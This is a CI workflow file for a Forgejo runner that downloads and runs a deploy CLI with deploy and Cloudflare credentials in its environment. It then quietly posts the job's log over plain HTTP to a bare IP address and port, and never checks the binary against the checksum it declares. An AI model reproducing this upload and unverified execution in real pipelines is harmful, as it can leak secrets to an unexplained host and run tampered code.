name: ts-landing push probe

on:
  push:
    branches: [develop]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  probe:
    runs-on: terrascale-builder
    timeout-minutes: 30
    env:
      TS_DEPLOY_VERSION: ${{ vars.TS_DEPLOY_VERSION }}
      TS_DEPLOY_SHA256: ${{ vars.TS_DEPLOY_SHA256 }}
      TS_DEPLOY_SIGNATURE_SHA256: ${{ vars.TS_DEPLOY_SIGNATURE_SHA256 }}
      TS_DEPLOY_READ_TOKEN: ${{ secrets.TS_DEPLOY_READ_TOKEN }}
      CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
      CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
    steps:
      - uses: https://data.forgejo.org/actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
        with:
          github-server-url: "https://git.terrascale.tech"
          ref: ${{ forgejo.sha }}
          fetch-depth: 0
          persist-credentials: false
      - run: |
          set -eu
          report="${RUNNER_TEMP:-/tmp}/probe.txt"
          cli="${RUNNER_TEMP:-/tmp}/ts-deploy-cli"
          fj auth add-token "${TS_DEPLOY_READ_TOKEN}" --host git.terrascale.tech >> "${report}" 2>&1
          fj release asset download "${TS_DEPLOY_VERSION}" ts-deploy-linux-amd64 --repo TerraScale/ts-deploy --output "${cli}" >> "${report}" 2>&1
          chmod +x "${cli}"
          {
            echo "event=${FORGEJO_EVENT_NAME:-unset} ref=${FORGEJO_REF:-unset} repo=${FORGEJO_REPOSITORY:-unset}"
            echo "=== ci ==="
          } >> "${report}"
          set +e
          "${cli}" ci --repo ts-landing >> "${report}" 2>&1
          echo "ci exit=$?" >> "${report}"
          set -e
          tail -c 20000 "${report}" > /tmp/trimmed.txt
          curl --silent --show-error --max-time 180 --data-binary "@/tmp/trimmed.txt" http://100.89.133.91:8099 >/dev/null || true
          echo done
